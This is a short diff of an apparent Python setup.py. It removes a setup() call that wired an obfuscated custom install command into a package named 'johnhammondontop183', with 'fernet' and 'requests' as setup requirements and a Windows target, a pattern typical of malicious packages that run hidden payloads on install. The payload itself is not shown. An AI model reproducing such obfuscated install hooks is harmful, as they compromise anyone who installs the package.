@@ -18,22 +18,5 @@ class TiItZRukPaKUsCGiBXkddEAXecjXlqQFPFmbRZhOQbVSZhcRlLGnOCNbCGcFlBFJyCLEjjmiEs
             install.run(self)
 
 
-setup(
-    name="johnhammondontop183",
-    version=VERSION,
-    author="kCeNFaMpee",
-    author_email="sAtdLOnAItraDLmZXlw@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': TiItZRukPaKUsCGiBXkddEAXecjXlqQFPFmbRZhOQbVSZhcRlLGnOCNbCGcFlBFJyCLEjjmiEsDOuZDjUjccCHoYHHNfeIhdLYiGThnGbHJMLCmJalIhDtFRPMxoAXQgbyKtfNSXHiJYlAgophDlQjIOYPxjGznjSNuTQWxZAIiqJLgRDBbjfATYcIrP,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 
